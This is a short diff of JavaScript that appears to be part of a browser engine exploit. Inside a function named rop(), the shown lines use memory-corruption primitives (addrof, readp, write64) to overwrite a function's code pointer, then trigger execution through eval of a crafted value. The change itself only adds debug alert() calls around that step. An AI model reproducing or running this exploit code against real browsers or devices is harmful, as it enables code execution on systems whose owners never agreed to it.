@@ -548,10 +548,12 @@ function rop() {
     const func = mem.addrof(eval).readp(offset_func_exec);
     func.write64(0x38, insn);
 
+    
     const obj = {a : 0};
+    alert('try');
     const res = eval(create_jsvalue(vector));
+    alert('success');
     obj.a = res;
-
     // read inline property
     const res2 = mem.addrof(obj).read64(offset_js_inline_property);
     debug_log(`res2: ${res2}`);
